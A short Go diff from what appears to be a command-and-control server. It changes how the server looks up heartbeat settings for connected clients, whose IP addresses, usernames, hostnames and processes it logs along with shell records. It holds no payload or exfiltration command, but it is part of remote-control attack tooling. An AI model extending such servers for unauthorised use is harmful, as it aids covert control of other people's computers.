@@ -463,7 +463,7 @@ func processMessage(ctx context.Context, reader *bufio.Reader, conn net.Conn, co
 			}
 
 			// 从监听器配置中获取心跳参数
-			heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByType(listenerType)
+			heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(conn.LocalAddr().String(), listenerType)
 
 			database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
 			database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
@@ -502,7 +502,7 @@ func processMessage(ctx context.Context, reader *bufio.Reader, conn net.Conn, co
 		// 统一离线检测器注册（心跳间隔取监听器配置——客户端二进制 patch 的同一值；
 		// 原用 client.Sleep(命令休眠,firstBlood 恒为 "1")→ 心跳间隔 ≥30s 的客户端会被误判离线）
 		if connection.GlobalOfflineDetector != nil {
-			_, hbInterval := database.GetListenerHeartbeatConfigByType(listenerType)
+			_, hbInterval := database.GetListenerHeartbeatConfigByAddr(conn.LocalAddr().String(), listenerType)
 			// 统一心跳：优先采用客户端上报的真实 sleep（MetaInfo 第5字段），回退监听器配置
 			clientMeta := strings.Split(string(metainfo[9:]), "\t")
 			sleepSec := connection.ResolveSleepSeconds(clientMeta, hbInterval)
